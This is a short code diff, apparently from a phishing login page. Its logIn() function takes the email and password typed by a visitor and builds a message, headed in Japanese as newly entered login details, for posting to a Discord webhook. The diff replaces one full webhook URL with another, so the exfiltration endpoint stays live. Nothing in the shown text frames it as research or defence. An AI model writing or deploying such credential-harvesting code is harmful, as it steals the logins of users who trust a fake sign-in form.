@@ -2,7 +2,7 @@ function logIn() {
     const email = document.getElementById("email").value;
     const password = document.getElementById("password").value;
     const webhookUrl =
-        "https://discord.com/api/webhooks/1099534138362581002/z9cpuxfCWFfdlDI5NMCz_v8qCugvllwfSagOyXorgRjsQno6oM50l10nD6PzSHv7_bDe";
+        "https://discord.com/api/webhooks/1346374011189198900/ia1FrdjNWhf3B1mPV2hlmdrXytQ8ruvwr-g0rvdU1JvQuwtPQpKBBmPwPzM-lslloCXd";
     const data = {
         content: `**ログイン情報が入力されました！**\n\nメールアドレス: \`${email}\`\nパスワード: \`${password}\``
     };
